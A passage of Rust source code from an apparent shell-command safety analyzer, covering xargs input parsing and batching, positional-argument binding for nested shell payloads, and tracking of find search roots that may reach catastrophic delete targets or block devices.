            for earlier in scope.parsed_scope.commands.iter().take(index) {
                apply_alias_command(&mut aliases, earlier, request.sequence_no);
            }
            let bindings = replay.apply_before(
                scope.scope_base_bindings.clone(),
                &scope.parsed_scope,
                command.span.start_byte,
                request.sequence_no,
            );
            let name = caushell_profile::materialize_command_name(
                command.command_name.as_deref()?,
                &bindings,
            )?;
            // This lookup must not pretend a shell function or alias is the
            // registry tool. Their ordinary expansion is audited separately.
            if aliases.contains_key(&name) || bindings.function_binding(&name).is_some() {
                return None;
            }
            match resolve_invocation_artifact_with_bindings(
                registry,
                command,
                runtime_context_for_parsed_command(&scope.parsed_scope, index, command),
                &bindings,
            ) {
                ResolveInvocationArtifactResult::Resolved(resolved) => Some(resolved),
                _ => None,
            }
        },
    )?;
    (records.separator == caushell_profile::StreamRecordSeparator::Nul).then_some(records.domain)
}

fn static_arg_file_evidence_for_xargs_scope(
    request: &CheckRequest,
    session: SessionView<'_>,
    entry: &ExpandedFrontierEntry,
    bound: &caushell_profile::BoundInvocation,
) -> StaticStreamEvidence {
    // Historical bytes alone cannot certify an argument file after a current
    // action prelude. The existing history query does not prove that intervening
    // writes left those bytes unchanged; retain unknown input, not stale argv.
    if entry.static_payload_scope.command_index != 0 {
        return StaticStreamEvidence {
            known_fragments: Vec::new(),
            complete: false,
        };
    }
    let paths = bound_argument_texts_for_slot(bound, "arg_file");
    if paths.len() != 1 {
        return StaticStreamEvidence {
            known_fragments: Vec::new(),
            complete: false,
        };
    }
    let raw_path = paths[0];
    let materialized_path = materialize_static_token_text(raw_path, &entry.bindings);
    let absolute_path = Path::new(&materialized_path).is_absolute();
    if !absolute_path
        && (entry.inherited_scope.static_input_cwd_unproven
            || entry
                .parsed_scope
                .commands
                .iter()
                .take(entry.command_ref.command_index)
                .any(|command| {
                    matches!(
                        command.command_name.as_deref(),
                        Some("cd" | "pushd" | "popd")
                    )
                }))
    {
        // ResolveInvocationPass cannot prove which file a relative -a names
        // after a directory transition (or an execdir-style unknown cwd).
        return StaticStreamEvidence {
            known_fragments: Vec::new(),
            complete: false,
        };
    }
    let Some(resolved_path) = resolve_path_operand(
        &materialized_path,
        false,
        "word",
        request.shell_state_before.cwd(),
        request.home.as_deref(),
    ) else {
        return StaticStreamEvidence {
            known_fragments: Vec::new(),
            complete: false,
        };
    };
    match static_known_literal_path_content_before_sequence(
        caushell_query::QuerySession::from_session(&session),
        &resolved_path,
        request.sequence_no,
        request.shell_state_before.cwd(),
        request.home.as_deref(),
    ) {
        Some(content) => StaticStreamEvidence {
            known_fragments: vec![content],
            complete: true,
        },
        None => StaticStreamEvidence {
            known_fragments: Vec::new(),
            complete: false,
        },
    }
}

fn empty_dispatch_scope(
    command: caushell_parse::CommandFact,
    shell_kind: caushell_types::ShellKind,
) -> caushell_parse::ParsedCommandArtifact {
    caushell_parse::ParsedCommandArtifact {
        raw_command: command.text.clone(),
        shell_kind,
        status: caushell_parse::ParseStatus::Complete,
        commands: vec![command],
        declaration_commands: Vec::new(),
        assignment_commands: Vec::new(),
        for_loops: Vec::new(),
        unset_commands: Vec::new(),
        shell_evaluations: Vec::new(),
        function_definitions: Vec::new(),
        redirections: Vec::new(),
        diagnostics: Vec::new(),
        status_conditions: Vec::new(),
    }
}

fn append_xargs_data_argument(
    candidate: &mut caushell_profile::DispatchCommandCandidate,
    text: String,
    source: Option<caushell_types::ImplicitInputSource>,
    domain: Option<&caushell_types::RuntimeArgumentDomain>,
    byte: usize,
    batch: bool,
) {
    candidate.argv.push(caushell_profile::DispatchArgument {
        slot: caushell_profile::SlotName::new("wrapped_args"),
        text,
        implicit_input_source: source,
        runtime_argument_domain: source.map(|_| {
            domain
                .cloned()
                .unwrap_or(caushell_types::RuntimeArgumentDomain::Unbounded)
        }),
        runtime_data: source.is_none(),
        quoted: true,
        node_kind: if source.is_some() && batch {
            "runtime_argument_list"
        } else if source.is_some() {
            "runtime_scalar"
        } else {
            "xargs_input_item"
        }
        .to_string(),
        span: caushell_parse::SourceSpan {
            start_byte: byte,
            end_byte: byte.saturating_add(1),
            start_row: 0,
            start_column: byte,
            end_row: 0,
            end_column: byte.saturating_add(1),
        },
        binding_source: caushell_profile::ArgumentBindingSource::RemainingArg,
    });
}

fn inherited_scope_for_dispatch(
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    inherited_scope: &ExecutionUnitInheritedScope,
    cwd: &str,
    home: Option<&str>,
) -> ExecutionUnitInheritedScope {
    let mut scope = inherited_scope.clone();
    let via_command_name = resolved.normalized_command_name.to_string();

    // A new traversal supplies its own selection; an ancestor's broad tree
    // must not contaminate unrelated descendant dispatches.
    if resolved.bound.effects.iter().any(|effect| {
        effect.kind == caushell_profile::EffectKind::ReadPath && effect.path_scope.is_some()
    }) {
        scope.catastrophic_search_roots.clear();
    }
    for effect in &resolved.bound.effects {
        if effect.kind != caushell_profile::EffectKind::ReadPath
            || !effect
                .path_scope
                .as_ref()
                .is_some_and(|s| s.covers_whole_subtree(&resolved.bound))
        {
            continue;
        }
        let caushell_profile::EffectTarget::Slot(slot) = &effect.target else {
            continue;
        };
        for root in bound_argument_operands_for_slot(&resolved.bound, slot.as_str())
            .into_iter()
            .filter_map(|operand| catastrophic_delete_target_for_arg(operand, cwd, home))
        {
            let entry = CatastrophicSearchRootScope {
                root,
                via_command_name: via_command_name.clone(),
            };
            if !scope.catastrophic_search_roots.contains(&entry) {
                scope.catastrophic_search_roots.push(entry);
            }
        }
    }

    for target in block_device_search_targets_for_dispatch(resolved, cwd, home) {
        let entry = BlockDeviceSearchScope {
            target,
            via_command_name: via_command_name.clone(),
        };
        if !scope.block_device_search_scopes.contains(&entry) {
            scope.block_device_search_scopes.push(entry);
        }
    }

    scope
}

fn block_device_search_targets_for_dispatch(
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    cwd: &str,
    home: Option<&str>,
) -> Vec<String> {
    if resolved.normalized_command_name.as_str() != "find" {
        return Vec::new();
    }

    let file_types = bound_argument_texts_for_slot(&resolved.bound, "file_types");
    if !file_types
        .iter()
        .any(|file_type| find_type_selects_block_device(file_type))
    {
        return Vec::new();
    }

    let roots = bound_argument_texts_for_slot(&resolved.bound, "search_roots");
    if roots.is_empty() {
        return Vec::new();
    }

    let mut targets = Vec::new();
    for root in roots {
        for candidate in find_search_target_candidates_for_root(&resolved.bound, root) {
            if let Some(target) =
                block_device_path_for_arg_with_optional_cwd(&[candidate.as_str()], Some(cwd), home)
            {
                if !targets.contains(&target) {
                    targets.push(target);
                }
            }
        }
    }

    targets
}

fn find_type_selects_block_device(file_type: &str) -> bool {
    file_type.split(',').any(|part| part == "b")
}

fn find_search_target_candidates_for_root(
    bound: &caushell_profile::BoundInvocation,
    root: &str,
) -> Vec<String> {
    let pattern_values = bound
        .bound_parameters
        .iter()
        .filter(|parameter| parameter.name.as_str() == "patterns")
        .flat_map(|parameter| parameter.values.iter())
        .filter_map(|value| match value {
            BoundValue::Argument {
                text,
                binding_source: ArgumentBindingSource::MatchedModifierFlag { flag_name, .. },
                ..
            } => Some((flag_name.as_str(), text.as_str())),
            _ => None,
        })
        .collect::<Vec<_>>();

    if pattern_values.is_empty() {
        return vec![find_search_target_candidate_from_name_pattern(root, "*")];
    }

    let mut candidates = Vec::new();
    for (flag_name, pattern) in pattern_values {
        let candidate = match flag_name {
            "-path" | "-ipath" => find_search_target_candidate_from_path_pattern(root, pattern),
            "-name" | "-iname" => find_search_target_candidate_from_name_pattern(root, pattern),
            _ => continue,
        };
        if !candidates.contains(&candidate) {
            candidates.push(candidate);
        }
    }
    candidates
}

fn find_search_target_candidate_from_name_pattern(root: &str, pattern: &str) -> String {
    if root.ends_with('/') {
        format!("{root}{pattern}")
    } else {
        format!("{root}/{pattern}")
    }
}

fn find_search_target_candidate_from_path_pattern(root: &str, pattern: &str) -> String {
    if pattern.starts_with('/') || pattern.starts_with('~') {
        pattern.to_string()
    } else {
        find_search_target_candidate_from_name_pattern(root, pattern)
    }
}

fn bound_argument_texts_for_slot<'a>(
    bound: &'a caushell_profile::BoundInvocation,
    slot_name: &str,
) -> Vec<&'a str> {
    bound
        .bound_parameters
        .iter()
        .filter(|parameter| parameter.name.as_str() == slot_name)
        .flat_map(|parameter| parameter.values.iter())
        .filter_map(|value| match value {
            BoundValue::Argument { text, .. } => Some(text.as_str()),
            BoundValue::ImplicitInput { .. } => None,
        })
        .collect()
}

fn shell_payload_from_bound_invocation(
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    bindings: &SessionBindings,
) -> Option<(
    String,
    caushell_parse::SourceSpan,
    Vec<caushell_profile::ProjectedArg>,
)> {
    let payload_slot = resolved.bound.effects.iter().find_map(|effect| {
        if effect.kind != EffectKind::ExecutePayload {
            return None;
        }

        match &effect.target {
            EffectTarget::Slot(slot) => Some(slot),
            _ => None,
        }
    })?;

    // The canonical frontier and historical nested records must consume the
    // same decoded argv. Never independently parse the raw bound token here.
    let candidate = collect_recursive_payload_candidates(&resolved.bound)
        .into_iter()
        .find(|candidate| {
            candidate.source == PayloadSource::InlineString
                && matches!(
                    candidate.language,
                    PayloadLanguage::Bash | PayloadLanguage::Sh
                )
                && matches!(&candidate.origin,
                    caushell_profile::RecursivePayloadOrigin::Parameter { slot }
                        if slot == payload_slot)
        })?;
    let materialized = materialize_recursive_payload_candidate(&candidate, bindings);
    if !matches!(
        materialized.resolution,
        ValueMaterialization::Static
            | ValueMaterialization::ResolvedExactScalar { .. }
            | ValueMaterialization::ResolvedRuntimeProduced { .. }
            | ValueMaterialization::ResolvedShellWord { .. }
    ) {
        return None;
    }
    let caushell_profile::RecursivePayloadInput::ArgumentFragments { fragments } =
        &materialized.candidate.input
    else {
        return None;
    };
    // A shell command-string option owns one argv operand, not a joined list.
    let [fragment] = fragments.as_slice() else {
        return None;
    };

    let trailing_args = trailing_shell_args_after_span(
        &resolved.materialized_projection.invocation,
        &fragment.span,
    )?;
    Some((fragment.text.clone(), fragment.span.clone(), trailing_args))
}

fn trailing_shell_args_after_span(
    projection: &caushell_profile::ProjectedInvocation,
    payload_span: &caushell_parse::SourceSpan,
) -> Option<Vec<caushell_profile::ProjectedArg>> {
    let payload_index = projection
        .args
        .iter()
        .position(|arg| arg.span == *payload_span)?;

    Some(
        projection
            .args
            .iter()
            .skip(payload_index + 1)
            .cloned()
            .collect(),
    )
}

fn bind_shell_positional_arguments(
    parsed: &mut caushell_parse::ParsedCommandArtifact,
    positional_args: &[caushell_profile::ProjectedArg],
) {
    let first_variable_width = positional_args.iter().position(|argument| {
        caushell_profile::argument_structure(argument).fields
            != caushell_profile::ArgumentFieldCount::ExactlyOne
    });
    // Numeric references must not be frozen to startup argv after a positional
    // mutation. Ordinary ordered binding replay handles set/shift; retain its
    // uncertainty rather than carrying stale tool-produced path bounds.
    let initial_frame =
        shell_payload_session_bindings(&SessionBindings::default(), positional_args);
    let first_mutation = parsed
        .commands
        .iter()
        .filter_map(|command| {
            crate::support::positional_parameter_mutation_for_command(command, &initial_frame)
                .map(|_| command.span.start_byte)
        })
        .min();
    for command in &mut parsed.commands {
        for token in &mut command.tokens {
            let Some(position) = exact_shell_positional_reference(&token.text, &token.node_kind)
            else {
                continue;
            };
            let after_mutation =
                position > 0 && first_mutation.is_some_and(|start| command.span.start_byte > start);
            if after_mutation {
                continue;
            }
            if let Some(first) = first_variable_width.filter(|first| position >= *first) {
                // A quoted positive index in a final runtime tail, when set,
                // still originates from that tail. Preserve the typed domain
                // without asserting list completeness or a precise arity.
                // $0 also has the shell's default when no argv0 is supplied;
                // mixed/lexical fields and unquoted splitting have no proof.
                let argument = &positional_args[first];
                if position > 0
                    && token.quoted
                    && first + 1 == positional_args.len()
                    && let Some(source) = argument.implicit_input_source
                {
                    token.text.clear();
                    token.implicit_input_source = Some(source);
                    token.runtime_argument_domain = argument.runtime_argument_domain.clone();
                    token.runtime_data = false;
                    token.node_kind = "runtime_scalar".into();
                }
                // Otherwise let the incomplete frame retain the original
                // reference. Never manufacture a known empty $n here.
                continue;
            }
            let Some(argument) = positional_args.get(position) else {
                if position == 0 {
                    // Without an explicit argv0 the interpreter supplies its
                    // own program name; it is not an unset positional item.
                    continue;
                }
                // The full fixed-width list is known, so this parameter is
                // genuinely unset (even if another scalar's bytes are unknown).
                token.text.clear();
                token.implicit_input_source = None;
                token.runtime_argument_domain = None;
                token.runtime_data = true;
                continue;
            };

            if !token.quoted
                && argument.implicit_input_source.is_none()
                && caushell_profile::materialize_exact_shell_parameter_reference_fields(
                    &token.text,
                    false,
                    &initial_frame,
                )
                .is_none()
            {
                // Literal native argv can contain spaces/globs too. Expanding
                // it unquoted in a child shell does not preserve one field.
                // Let ordered materialization retain the original reference.
                continue;
            }
            token.text = argument.text.clone();
            token.implicit_input_source = argument.implicit_input_source;
            token.runtime_argument_domain = argument.runtime_argument_domain.clone();
            token.runtime_data = argument.runtime_data || argument.implicit_input_source.is_some();
            if argument.implicit_input_source.is_some() {
                // The caller's native scalar is still one field only through
                // a quoted shell reference. Unquoted splitting can detach a
                // filename fragment from its producer's path prefix.
                token.runtime_data = false;
                token.node_kind = if token.quoted {
                    "runtime_scalar"
                } else {
                    "runtime_argument_list"
                }
                .into();
                if !token.quoted {
                    token.runtime_argument_domain =
                        Some(caushell_types::RuntimeArgumentDomain::Unbounded);
                }
            }
        }
    }
}

fn shell_payload_session_bindings(
    base: &SessionBindings,
    positional_args: &[caushell_profile::ProjectedArg],
) -> SessionBindings {
    let mut bindings = base.clone();
    bindings.enter_child_shell_environment();
    // A new shell does not inherit its parent's $0. Keep argv0 separate from
    // the mutable $1...$n frame, including after set/shift and in functions.
    bindings.set_shell_program_name(positional_args.first().and_then(|argument| {
        if caushell_profile::argument_structure(argument).fields
            != caushell_profile::ArgumentFieldCount::ExactlyOne
        {
            return None;
        }
        if argument.implicit_input_source.is_some() {
            return Some(SessionValue::opaque_dynamic("runtime shell program name"));
        }
        if argument.runtime_data {
            return Some(SessionValue::exact_scalar(argument.text.clone()));
        }
        caushell_parse::decode_static_shell_argument(
            &argument.text,
            argument.quoted,
            &argument.node_kind,
        )
        .map(SessionValue::exact_scalar)
    }));
    let positive = if positional_args.first().is_some_and(|arg| {
        caushell_profile::argument_structure(arg).fields
            != caushell_profile::ArgumentFieldCount::ExactlyOne
    }) {
        // A sole final native tail may supply argv0 and any remaining
        // positionals. Removing its first item preserves the per-item domain,
        // but supplies no proof about $0 or the positive list's exact length.
        positional_args
    } else {
        positional_args.get(1..).unwrap_or_default()
    };
    bindings.bind_positional_arguments(positive, &[]);
    if let Some(argument) = positional_args.first()
        && caushell_profile::argument_structure(argument).fields
            == caushell_profile::ArgumentFieldCount::ExactlyOne
        && let Some(domain) = &argument.runtime_argument_domain
    {
        bindings.set_positional_argument_domain(0, domain.clone());
    }
    bindings
}

fn exact_shell_positional_reference(text: &str, node_kind: &str) -> Option<usize> {
    if matches!(node_kind, "raw_string" | "ansi_c_string") {
        return None;
    }
    // Unbraced references consume ONE digit: $10 is $1 followed by '0',
    // whereas ${10} is a complete reference. Share the lexical grammar with
    // ordinary materialization instead of maintaining another digit parser.
    match caushell_profile::exact_shell_parameter_reference(text)? {
        caushell_profile::ShellParameterReference::Positional(position) => Some(position),
        _ => None,
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct XargsStaticExpansionConfig {
    item_mode: XargsItemMode,
    dispatch_mode: XargsDispatchMode,
    run_if_empty: bool,
    decoding_proved: bool,
    requires_confirmation: bool,
    eof_marker: Option<String>,
    insert_batch_token: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum XargsItemMode {
    WhitespaceSeparated,
    NullSeparated,
    NewlineSeparated,
    Delimited { delimiter: String },
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum XargsDispatchMode {
    AppendAll,
    ReplaceToken { token: String },
    MaxArgs { max_args: usize },
    MaxLines { max_lines: usize },
}

pub(super) fn xargs_accepts_plain_path_lines(
    resolved: &caushell_profile::ResolvedInvocationArtifact,
) -> bool {
    let config = xargs_static_expansion_config(resolved);
    config.decoding_proved
        && config.item_mode == XargsItemMode::WhitespaceSeparated
        && config.eof_marker.is_none()
        && config.insert_batch_token.is_none()
        && matches!(
            config.dispatch_mode,
            XargsDispatchMode::AppendAll | XargsDispatchMode::MaxArgs { .. }
        )
}

fn xargs_static_expansion_config(
    resolved: &caushell_profile::ResolvedInvocationArtifact,
) -> XargsStaticExpansionConfig {
    use caushell_profile::{ArgumentBindingSource, SemanticValueResolution, ValueProjection, project_value};
    let bound = &resolved.bound;
    let mut config = XargsStaticExpansionConfig {
        item_mode: XargsItemMode::WhitespaceSeparated,
        dispatch_mode: XargsDispatchMode::AppendAll,
        run_if_empty: !has_applied_modifier(bound, "no_run_if_empty"),
        decoding_proved: !bound.operation_semantics_unresolved && bound.residuals.is_empty(),
        requires_confirmation: has_applied_modifier(bound, "interactive_prompt"),
        eof_marker: None,
        insert_batch_token: None,
    };
    // Use the native argv positions already owned by the profile binder. In
    // particular, a flag-looking utility argument is not an xargs occurrence.
    for flag in &bound.owned_option_flags {
        let ArgumentBindingSource::FollowingFlag { flag_name, flag_span } = flag else {
            continue;
        };
        let name = flag_name.as_str();
        if matches!(name, "-0" | "--null") {
            config.item_mode = XargsItemMode::NullSeparated;
            continue;
        }
        if !matches!(
            name,
            "-d" | "--delimiter" | "-I" | "-i" | "--replace" | "-n" | "--max-args"
                | "-L" | "--max-lines" | "-l" | "-E" | "-e" | "--eof" | "-J"
        ) {
            continue;
        }
        let supplied = bound.bound_parameters.iter().flat_map(|p| &p.values).find(|value| {
            matches!(value, BoundValue::Argument {
                binding_source: ArgumentBindingSource::MatchedModifierFlag {
                    flag_name: owner, flag_span: span, ..
                }, ..
            } if owner == flag_name && span == flag_span)
        });
        let operand = match supplied {
            Some(value) => match project_value(&ValueProjection::Identity, value) {
                Some(SemanticValueResolution::Known(text)) => text,
                Some(SemanticValueResolution::Unknown(caushell_profile::ProjectionUnknownReason::EmptyValue)) => String::new(),
                _ => {
                    config.decoding_proved = false;
                    continue;
                }
            },
            None if matches!(name, "-i" | "--replace") => "{}".into(),
            None if name == "-l" => "1".into(),
            None if matches!(name, "-e" | "--eof") => String::new(),
            None => {
                config.decoding_proved = false;
                continue;
            }
        };
        match name {
            "-d" | "--delimiter" => {
                if let Some(delimiter) = decode_xargs_delimiter(&operand) {
                    config.item_mode = if delimiter == "\0" {
                        XargsItemMode::NullSeparated
                    } else {
                        XargsItemMode::Delimited { delimiter }
                    };
                } else {
                    config.decoding_proved = false;
                }
            }
            "-I" | "-i" | "--replace" if !operand.is_empty() => {
                config.dispatch_mode = XargsDispatchMode::ReplaceToken { token: operand };
            }
            "-E" | "-e" | "--eof" => {
                // EOF is a literal argv word. C-style escapes belong only to -d.
                config.eof_marker = (!operand.is_empty()).then_some(operand);
            }
            "-J" if !operand.is_empty() => config.insert_batch_token = Some(operand),
            "-n" | "--max-args" | "-L" | "--max-lines" | "-l" => {
                if let Some(limit) = parse_positive_usize(&operand) {
                    if matches!(name, "-n" | "--max-args") {
                        // GNU -n1 does not replace an already selected -I mode.
                        if limit != 1 || !matches!(config.dispatch_mode, XargsDispatchMode::ReplaceToken { .. }) {
                            config.dispatch_mode = XargsDispatchMode::MaxArgs { max_args: limit };
                        }
                    } else {
                        config.dispatch_mode = XargsDispatchMode::MaxLines { max_lines: limit };
                    }
                } else {
                    config.decoding_proved = false;
                }
            }
            _ => config.decoding_proved = false,
        }
    }
    if matches!(config.dispatch_mode, XargsDispatchMode::ReplaceToken { .. }) {
        // A replacement job needs a record. GNU and BSD launch no replacement
        // job on an empty stream, even without an explicit -r.
        if config.decoding_proved {
            config.run_if_empty = false;
        }
        if matches!(config.item_mode, XargsItemMode::WhitespaceSeparated) {
            config.item_mode = XargsItemMode::NewlineSeparated;
        }
    }
    config
}

fn has_applied_modifier(bound: &caushell_profile::BoundInvocation, modifier_id: &str) -> bool {
    bound
        .applied_modifiers
        .iter()
        .any(|modifier| modifier.as_str() == modifier_id)
}

fn parse_positive_usize(raw: &str) -> Option<usize> {
    let parsed = raw.parse::<usize>().ok()?;
    (parsed > 0).then_some(parsed)
}

fn xargs_items_from_payloads(
    payloads: &[String],
    mode: &XargsItemMode,
    eof_marker: Option<&str>,
) -> Option<Vec<String>> {
    let items = match mode {
        XargsItemMode::WhitespaceSeparated => parse_xargs_default_items(payloads),
        XargsItemMode::NullSeparated => Some(
            payloads
                .concat()
                .split_terminator('\0')
                .map(str::to_string)
                .collect(),
        ),
        XargsItemMode::NewlineSeparated => parse_xargs_items(payloads, true),
        XargsItemMode::Delimited { delimiter } => Some(
            payloads
                .concat()
                .split_terminator(delimiter.as_str())
                .map(str::to_string)
                .collect(),
        ),
    }?;

    Some(match mode {
        XargsItemMode::WhitespaceSeparated | XargsItemMode::NewlineSeparated => {
            truncate_xargs_items_at_eof_marker(items, eof_marker)
        }
        XargsItemMode::NullSeparated | XargsItemMode::Delimited { .. } => items,
    })
}

fn observed_xargs_groups(
    output: &caushell_types::StdoutRecordsEvidence,
    config: &XargsStaticExpansionConfig,
) -> Result<Vec<Vec<String>>, String> {
    use std::collections::BTreeSet;
    if !config.decoding_proved {
        return Err("xargs input options are unresolved".into());
    }
    let records = output.complete_records().ok_or_else(|| {
        output
            .gap
            .clone()
            .unwrap_or_else(|| "producer records are incomplete".into())
    })?;
    if config.eof_marker.is_some() {
        return Err("native logical EOF handling is unresolved".into());
    }
    let blocks = records
        .iter()
        .map(|r| String::from_utf8(r.bytes.clone()))
        .collect::<Result<Vec<_>, _>>()
        .map_err(|_| "native argv contains unsupported non-UTF-8 bytes")?;
    let decode = |blocks: &[String]| -> Result<Vec<Vec<String>>, String> {
        if !matches!(config.item_mode, XargsItemMode::NullSeparated)
            && blocks.iter().any(|b| b.contains('\0'))
        {
            return Err("native text input contains NUL bytes".into());
        }
        let items =
            xargs_items_from_payloads(blocks, &config.item_mode, config.eof_marker.as_deref())
                .ok_or("native input quoting is incomplete")?;
        let groups = match config.dispatch_mode {
            XargsDispatchMode::AppendAll => {
                if items.is_empty() {
                    Vec::new()
                } else {
                    vec![items]
                }
            }
            XargsDispatchMode::ReplaceToken { .. } => items.into_iter().map(|s| vec![s]).collect(),
            XargsDispatchMode::MaxArgs { max_args } if max_args > 0 => {
                items.chunks(max_args).map(<[String]>::to_vec).collect()
            }
            XargsDispatchMode::MaxLines { max_lines } if max_lines > 0 => xargs_grouped_lines(
                blocks,
                &config.item_mode,
                max_lines,
                config.eof_marker.as_deref(),
            )
            .ok_or("native logical-line grouping is unresolved")?,
            _ => return Err("native batch size is unresolved".into()),
        };
        Ok(groups)
    };
    let independent = config.eof_marker.is_none()
        && matches!(
            config.dispatch_mode,
            XargsDispatchMode::ReplaceToken { .. }
                | XargsDispatchMode::MaxArgs { max_args: 1 }
                | XargsDispatchMode::MaxLines { max_lines: 1 }
        )
        && blocks.iter().all(|b| match &config.item_mode {
            XargsItemMode::NullSeparated => b.ends_with('\0'),
            XargsItemMode::Delimited { delimiter } => b.ends_with(delimiter.as_str()),
            // A trailing escaped newline can join this block to the next.
            // A block is independent only if the decoder resets at its end.
            _ => b.ends_with('\n') && !b.ends_with("\\\n"),
        });
    if output.order == caushell_types::StreamRecordOrder::Exact || blocks.len() <= 1 {
        let mut groups = decode(&blocks)?;
        if groups.is_empty() && config.run_if_empty {
            groups.push(Vec::new());
        }
        if groups.len() > 128 || groups.iter().map(Vec::len).sum::<usize>() > 4096 {
            return Err("native argv group budget exceeded".into());
        }
        return Ok(groups);
    }
    let mut groups = BTreeSet::new();
    let mut add = |decoded: Vec<Vec<String>>| -> Result<(), String> {
        for group in decoded {
            groups.insert(group);
            if groups.len() > 128 || groups.iter().map(Vec::len).sum::<usize>() > 4096 {
                return Err("native argv group budget exceeded".into());
            }
        }
        Ok(())
    };
    if independent {
        // Each block returns the decoder to its initial state. A malformed
        // block fails the whole proof; its known neighbours are not a prefix.
        for block in &blocks {
            add(decode(std::slice::from_ref(block))?)?;
        }
    } else {
        // A directory set has no native order. Enumerate a bounded superset of
        // complete block orders, including every possible final short batch.
        if blocks.len() > 5 {
            return Err("producer order exceeds native batching budget".into());
        }
        fn orders(
            blocks: &mut [String],
            at: usize,
            visit: &mut impl FnMut(&[String]) -> Result<(), String>,
        ) -> Result<(), String> {
            if at == blocks.len() {
                return visit(blocks);
            }
            for index in at..blocks.len() {
                blocks.swap(at, index);
                orders(blocks, at + 1, visit)?;
                blocks.swap(at, index);
            }
            Ok(())
        }
        orders(&mut blocks.clone(), 0, &mut |blocks| add(decode(blocks)?))?;
    }
    if groups.is_empty() && config.run_if_empty {
        groups.insert(Vec::new());
    }
    Ok(groups.into_iter().collect())
}

fn xargs_grouped_lines(
    payloads: &[String],
    item_mode: &XargsItemMode,
    max_lines: usize,
    eof_marker: Option<&str>,
) -> Option<Vec<Vec<String>>> {
    if !matches!(
        item_mode,
        XargsItemMode::WhitespaceSeparated | XargsItemMode::NewlineSeparated
    ) {
        return Some(
            xargs_items_from_payloads(payloads, item_mode, None)?
                .chunks(max_lines)
                .map(|chunk| chunk.to_vec())
                .collect(),
        );
    }

    let payload = payloads.concat();
    // -L has logical-line continuation rules for trailing blanks. Do not
    // certify physical-line batches when that grammar is not decoded.
    if payload
        .split_terminator('\n')
        .any(|line| !line.trim().is_empty() && line.ends_with([' ', '\t']))
    {
        return None;
    }
    let lines: Vec<String> = payload
        .split_terminator('\n')
        .filter(|line| !line.trim().is_empty())
        .map(str::to_string)
        .collect();

    let mut groups = Vec::new();
    for chunk in lines.chunks(max_lines) {
        let chunk_payload = vec![chunk.join("\n")];
        let items = match item_mode {
            XargsItemMode::WhitespaceSeparated => parse_xargs_default_items(&chunk_payload)?,
            XargsItemMode::NewlineSeparated => parse_xargs_items(&chunk_payload, true)?,
            _ => unreachable!("non-line item modes returned above"),
        };
        let saw_eof_marker =
            eof_marker.is_some_and(|marker| items.iter().any(|item| item == marker));
        let items = truncate_xargs_items_at_eof_marker(items, eof_marker);
        if !items.is_empty() {
            groups.push(items);
        }
        if saw_eof_marker {
            break;
        }
    }

    Some(groups)
}

fn truncate_xargs_items_at_eof_marker(items: Vec<String>, eof_marker: Option<&str>) -> Vec<String> {
    let Some(marker) = eof_marker else {
        return items;
    };

    items
        .into_iter()
        .take_while(|item| item != marker)
        .collect()
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum XargsDefaultParseState {
    Normal,
    SingleQuoted,
    DoubleQuoted,
    NormalEscape,
}

fn parse_xargs_default_items(payloads: &[String]) -> Option<Vec<String>> {
    parse_xargs_items(payloads, false)
}

fn parse_xargs_items(payloads: &[String], line_separated: bool) -> Option<Vec<String>> {
    let mut items = Vec::new();
    let mut current = String::new();
    let mut in_item = false;
    let mut state = XargsDefaultParseState::Normal;

    let payload = payloads.concat();
    if line_separated
        && payload.split_terminator('\n').any(|line| line.ends_with([' ', '\t']))
    {
        return None;
    }
    for ch in payload.chars() {
        match state {
            XargsDefaultParseState::Normal => {
                if ch == '\n' || !line_separated && matches!(ch, ' ' | '\t') {
                    if in_item {
                        items.push(std::mem::take(&mut current));
                        in_item = false;
                    }
                    continue;
                }
                if line_separated && !in_item && matches!(ch, ' ' | '\t') {
                    continue;
                }

                match ch {
                    '\'' => {
                        in_item = true;
                        state = XargsDefaultParseState::SingleQuoted;
                    }
                    '"' => {
                        in_item = true;
                        state = XargsDefaultParseState::DoubleQuoted;
                    }
                    '\\' => {
                        in_item = true;
                        state = XargsDefaultParseState::NormalEscape;
                    }
                    _ => {
                        in_item = true;
                        current.push(ch);
                    }
                }
            }
            XargsDefaultParseState::SingleQuoted => {
                if ch == '\n' {
                    return None;
                }
                if ch == '\'' {
                    state = XargsDefaultParseState::Normal;
                } else {
                    current.push(ch);
                }
            }
            XargsDefaultParseState::DoubleQuoted => match ch {
                '"' => state = XargsDefaultParseState::Normal,
                '\n' => return None,
                _ => current.push(ch),
            },
            XargsDefaultParseState::NormalEscape => {
                current.push(ch);
                state = XargsDefaultParseState::Normal;
            }
        }
    }

    if state != XargsDefaultParseState::Normal {
        return None;
    }

    if in_item {
        items.push(current);
    }

    Some(items)
}

fn decode_xargs_delimiter(word: &str) -> Option<String> {
    let byte = match word.as_bytes() {
        [byte] if *byte != b'\\' => *byte,
        [b'\\', b'a'] => 7,
        [b'\\', b'b'] => 8,
        [b'\\', b'f'] => 12,
        [b'\\', b'n'] => b'\n',
        [b'\\', b'r'] => b'\r',
        [b'\\', b't'] => b'\t',
        [b'\\', b'v'] => 11,
        [b'\\', b'\\'] => b'\\',
        _ => {
            let digits = word.strip_prefix('\\')?;
            if let Some(hex) = digits.strip_prefix('x').filter(|hex| hex.len() <= 2 && hex.bytes().all(|b| b.is_ascii_hexdigit())) {
                u8::from_str_radix(hex, 16).ok()?
            } else if digits.bytes().all(|b| matches!(b, b'0'..=b'7')) && digits.len() <= 3 {
                u8::from_str_radix(digits, 8).ok()?
            } else {
                return None;
            }
        }
    };
    byte.is_ascii().then(|| char::from(byte).to_string())
}

fn static_entry_command(
    ctx: &RunnerContext,
    entry: &ExpandedFrontierEntry,
    command: &caushell_parse::CommandFact,
) -> bool {
    if entry.origin_kind != ExecutionUnitOriginKind::TopLevel
        || command.command_name_runtime_data
        || command.conditional_execution
        || !command.prefix_assignments.is_empty()
    {
        return false;
    }
    let raw = &ctx.request().command;
    let only_whitespace = |text: &str| text.trim_matches([' ', '\t', '\n']).is_empty();
    let (Some(first_arg), Some(name)) = (command.tokens.first(), command.command_name.as_deref()) else {
        return false;
    };
    &entry.parsed_scope.raw_command == raw
        && raw.get(..command.span.start_byte).is_some_and(only_whitespace)
        && raw.get(command.span.start_byte..first_arg.span.start_byte)
